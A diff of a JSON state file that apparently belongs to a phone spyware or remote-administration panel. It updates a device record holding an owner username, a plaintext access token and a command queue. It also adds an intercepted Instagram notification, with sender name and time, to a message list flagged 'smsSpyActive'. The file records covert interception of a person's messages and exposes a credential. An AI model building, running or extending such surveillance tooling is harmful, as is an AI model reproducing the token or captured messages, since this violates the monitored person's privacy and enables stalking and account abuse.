@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776780221218,
+    "lastSeen": 1776780224158,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Instagram",
+        "sender": "warmblanketboy2k13: ndrensyh🕊️",
+        "content": "Pesan baru",
+        "time": "21/04 21:03",
+        "pkg": "com.instagram.android",
+        "receivedAt": 1776780224570
+      },
       {
         "appName": "Instagram",
         "sender": "warmblanketboy2k13: ndrensyh🕊️",
